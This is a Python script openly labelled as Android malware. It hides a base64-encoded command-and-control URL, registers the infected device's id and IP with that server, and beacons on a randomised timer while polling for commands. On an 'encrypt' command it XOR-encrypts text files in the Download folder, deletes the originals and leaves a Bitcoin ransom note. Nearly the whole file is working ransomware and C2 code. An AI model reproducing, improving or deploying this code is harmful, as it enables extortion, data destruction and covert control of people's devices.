# ============================================
# STAGER.PY - ANDROID MALWARE
# Runs in background, connects to C2, encrypts files
# ============================================

import requests
import socket
import time
import os
import sys
import random
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# OBFUSCATION (Hide Server URL)
# ============================================
import base64

def decode(encoded):
    return base64.b64decode(encoded).decode('utf-8')

encoded_url = "aHR0cHM6Ly9uZXdtZXRob2QtaXNoNi5vbnJlbmRlci5jb20="
encoded_id = "Mw=="
encoded_name = "UGhvbmU="

base_url = decode(encoded_url)
device_id = decode(encoded_id)
device_name = decode(encoded_name)
device_ip = socket.gethostbyname(socket.gethostname())

# ============================================
# RANSOMWARE (Encrypt .txt files)
# ============================================
def xor_encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = bytes([b ^ key for b in data])
        with open(filepath + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
        return True
    except Exception as e:
        return False

def ransomware_attack():
    folder = "/storage/emulated/0/Download/"
    key = random.randint(1, 255)
    count = 0

    for filename in os.listdir(folder):
        if filename.endswith('.txt') and filename != 'READ_ME.txt':
            filepath = os.path.join(folder, filename)
            if xor_encrypt_file(filepath, key):
                count += 1
                print(f"Encrypted: {filename}")

    if count > 0:
        note_path = os.path.join(folder, "READ_ME.txt")
        with open(note_path, 'w') as f:
            f.write("Your files have been encrypted.\n")
            f.write(f"XOR Key: {key}\n")
            f.write("Send $100 in Bitcoin to [address].\n")
        print(f"Ransom note created. {count} files encrypted.")
    else:
        print("No .txt files found.")

# ============================================
# REGISTER DEVICE WITH C2
# ============================================
def register_device():
    url = base_url + "/devices"
    data = {"id": device_id, "name": device_name, "ip": device_ip}
    try:
        response = requests.post(url, json=data, verify=False)
        print("Device registered:", response.text)
    except Exception as e:
        print("Registration error:", e)

# ============================================
# BEACON LOOP
# ============================================
def beacon_loop():
    while True:
        # Send beacon
        try:
            beacon_url = base_url + "/beacon"
            response = requests.get(beacon_url, verify=False)
            print(f"Beacon sent at {time.strftime('%H:%M:%S')}")
        except Exception as e:
            print("Beacon error:", e)

        # Check for commands
        try:
            command_url = base_url + "/command"
            response = requests.post(
                command_url,
                json={"deviceId": device_id},
                verify=False
            )
            if response.status_code == 200:
                cmd_data = response.json()
                command = cmd_data.get("command")
                if command == "encrypt":
                    print("Ransomware command received!")
                    ransomware_attack()
                elif command == "beacon":
                    print("Beacon command received.")
                elif command is None:
                    pass
                else:
                    print("Unknown command:", command)
        except Exception as e:
            print("Command error:", e)

        sleep_time = random.randint(20, 45)
        time.sleep(sleep_time)

# ============================================
# MAIN
# ============================================
def main():
    register_device()
    beacon_loop()

if __name__ == "__main__":
    main()
